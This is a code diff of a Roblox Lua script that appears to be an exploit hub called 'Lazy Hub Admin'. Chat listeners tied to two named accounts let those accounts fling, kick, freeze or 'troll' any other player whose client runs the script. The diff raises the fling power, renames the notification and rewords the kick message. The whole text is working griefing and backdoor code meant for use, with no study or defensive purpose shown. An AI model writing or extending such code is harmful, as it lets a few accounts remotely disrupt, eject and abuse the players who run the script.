@@ -20,7 +20,7 @@ user_premium__001.Chatted:connect(function(cht)
 	if cht:match(".fling .") then
 		if game.Players.LocalPlayer ~= user_premium__001 then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999, 0)
-			power = 99999999 -- change this to make it more or less powerful
+			power = 9999999999999999999999 -- change this to make it more or less powerful
  
 			game:GetService('RunService').Stepped:connect(function()
 			game.Players.LocalPlayer.Character.Head.CanCollide = false
@@ -159,9 +159,9 @@ user_premium__001.Chatted:connect(function(cht)
 	if cht:match(".cmdx") then
 		if game.Players.LocalPlayer == user_premium__001 then
 game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = ".";
+	Title = "Lazy Hub Admin";
 	Text = ".freeze .bring .error .oof .kick .fling .sit .unsit .troll .donate .say .enlighten";
-	Time = 5;
+	Time = 10;
 	Icon = "rbxassetid://999999999";
 }) 
 		end
@@ -224,7 +224,7 @@ end)
 user_premium__002.Chatted:connect(function(cht)
 	if cht:match(".kick .") then
 		if game.Players.LocalPlayer ~= user_premium__002 then
-			game.Players.LocalPlayer:kick("You have been kicked.")
+			game.Players.LocalPlayer:kick("You have been Kicked by Lazy Hub Admin.")
 		end
 	end
 
